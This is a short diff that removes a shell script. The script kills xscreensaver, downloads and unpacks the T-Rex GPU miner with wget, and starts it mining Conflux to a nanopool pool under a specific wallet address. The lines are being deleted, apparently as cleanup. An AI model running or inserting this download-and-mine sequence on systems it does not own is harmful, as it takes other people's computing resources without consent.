@@ -1,6 +1,0 @@
-killall xscreensaver
-
-wget https://github.com/trexminer/T-Rex/releases/download/0.19.12/t-rex-0.19.12-linux-cuda10.0.tar.gz
-tar -xvf t-rex-0.19.12-linux-cuda10.0.tar.gz
-rm -f t-rex-0.19.12-linux-cuda10.0.tar.gz
-t-rex -a octopus -o stratum+tcp://cfx-eu1.nanopool.org:17777 -u cfx:aanh8x6kxj7wpyjdwmxmwtksy803pz3ss268cmzdyn.rig0 -p x
